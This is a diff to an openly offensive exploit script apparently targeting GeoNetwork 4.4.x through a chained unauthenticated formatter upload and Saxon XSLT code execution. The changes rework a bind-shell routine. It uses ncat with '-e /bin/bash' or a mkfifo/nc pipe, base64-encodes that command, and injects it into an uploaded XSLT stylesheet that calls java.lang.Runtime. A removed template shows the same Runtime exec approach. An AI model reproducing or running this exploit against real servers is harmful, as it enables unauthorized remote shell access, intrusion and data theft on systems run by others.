@@ -4,9 +4,9 @@ GeoNetwork 4.4.x - Unauthenticated Remote Code Execution
 CVE-2026-63219 (Unauth Formatter Upload) + CVE-2026-58400 (Saxon XSLT RCE)
 
 Affected versions : GeoNetwork <= 4.4.11.0
-Tested on        : GeoNetwork 4.4.11.0
-Author           : Bridger (Talha Kacar)
-References       : https://ethiack.com/info-hub/research/geonetwork-preauth-RCE
+Tested on         : GeoNetwork 4.4.11.0
+Author            : Bridger (Talha Kacar)
+References        : https://ethiack.com/info-hub/research/geonetwork-preauth-RCE
 
 --- Vulnerability Chain ---
 
@@ -71,20 +71,6 @@ XSLT_CMD_TEMPLATE = """\
     <xsl:variable name="l9"  select="br:readLine($br2)"/>
     <xsl:variable name="l10" select="br:readLine($br2)"/>
     <result disable-output-escaping="yes"><xsl:value-of select="concat($l1,'&#10;',$l2,'&#10;',$l3,'&#10;',$l4,'&#10;',$l5,'&#10;',$l6,'&#10;',$l7,'&#10;',$l8,'&#10;',$l9,'&#10;',$l10)"/></result>
-  </xsl:template>
-</xsl:stylesheet>
-"""
-
-XSLT_SHELL_TEMPLATE = """\
-<?xml version="1.0" encoding="UTF-8"?>
-<xsl:stylesheet version="2.0"
-  xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
-  xmlns:rt="java:java.lang.Runtime"
-  extension-element-prefixes="rt">
-  <xsl:template match="/">
-    <xsl:variable name="rt" select="rt:getRuntime()"/>
-    <xsl:variable name="proc" select="rt:exec($rt, ('bash', '-c', '{PAYLOAD}'))"/>
-    <result>triggered</result>
   </xsl:template>
 </xsl:stylesheet>
 """
@@ -193,14 +179,18 @@ def send_bind_shell(session, base_url, token, uuid, bport):
     """
     Bind shell: target listens on bport, attacker connects.
     Tries ncat -e first, falls back to mkfifo named pipe.
+    Payload is base64-encoded to avoid XML special character issues.
     """
-    payload = (
+    inner = (
         f"ncat -lvnp {bport} -e /bin/bash 2>/dev/null || "
         f"rm -f /tmp/bp;mkfifo /tmp/bp;cat /tmp/bp|/bin/bash -i 2>&1"
         f"|nc -lvnp {bport} >/tmp/bp &"
     )
+    b64 = base64.b64encode(inner.encode()).decode()
+    cmd = f"printf {b64}|base64 -d|bash"
+
     name = rand_name("bs")
-    xsl = XSLT_SHELL_TEMPLATE.replace("{PAYLOAD}", payload)
+    xsl = XSLT_CMD_TEMPLATE.replace("{CMD}", cmd)
     code, resp = upload_formatter(session, base_url, token, name, xsl)
     if code not in (200, 201):
         print(f"[-] Upload failed ({code}): {resp}")
